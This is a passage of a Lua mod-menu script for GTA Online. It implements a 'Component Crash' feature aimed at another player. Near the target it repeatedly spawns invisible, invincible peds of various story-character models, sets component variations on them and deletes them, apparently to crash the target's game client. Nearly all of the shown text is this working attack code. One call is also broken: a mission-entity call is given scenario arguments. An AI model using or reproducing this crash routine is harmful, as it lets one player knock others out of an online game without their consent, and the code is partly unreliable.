                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds18[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds18[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds18[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds18[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds18[i], 4, 1, 3, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds18[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_mrs_thornhill")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds19 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds19[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds19[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds19[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds19[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds19[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds19[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_nigel")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds20 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds20[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds20[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds20[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds20[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds20[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds20[i])
                    util.yield(5)					
                end
                util.yield(100)
                util.toast("Done")
            else
                util.toast("You can't use it on yourself")
            end
    end)


    menu.toggle_loop(clothescrash, "Component Crash", {"toggleclothescrash"}, "Crash clothes", function(on_toggle)
            if pid ~= players.user() then
                util.toast("Wait 20 Seconds...")
                local math_random = math.random
                local joaat = util.joaat
                util.yield(100)
                local pedhash = util.joaat("P_franklin_02")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds1[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lazlow")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds2 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds2[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds2[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds2[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds2[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds2[i], 3, 0, 3, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds2[i])
                    util.yield(5)
                end
                util.yield(5)
                local pedhash = util.joaat("cs_taocheng")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds3 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds3[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds3[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds3[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds3[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds3[i], 3, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds3[i])
                    util.yield(5)
                end
                util.yield(5)
                local pedhash = util.joaat("cs_solomon")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds4 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds4[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds4[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds4[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds4[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds4[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds4[i])
                    util.yield(5)
                end
                util.yield(5)
                local pedhash = util.joaat("cs_stevehains")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds5 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds5[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds5[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds5[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds5[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds5[i], 3, 1, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds5[i])
                    util.yield(5)
                end
                
                local pedhash = util.joaat("cs_taostranslator")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds6 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds6[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds6[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds6[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds6[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds6[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds6[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_debra")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds7 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds7[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds7[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds7[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds7[i], 4, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds7[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_devin")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds8 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds8[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds8[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds8[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds8[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds8[i], 3, 1, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds8[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_guadalope")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds9 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds9[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds9[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds9[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds9[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds9[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds9[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_gurk")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds10 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds10[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds10[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds10[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds10[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds10[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds10[i])
                    util.yield(5)
                end
                
                local pedhash = util.joaat("cs_jimmydisanto")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds11 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds11[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds11[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds11[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds11[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds11[i], 3, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds11[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_josh")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds12 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds12[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds12[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds12[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds12[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
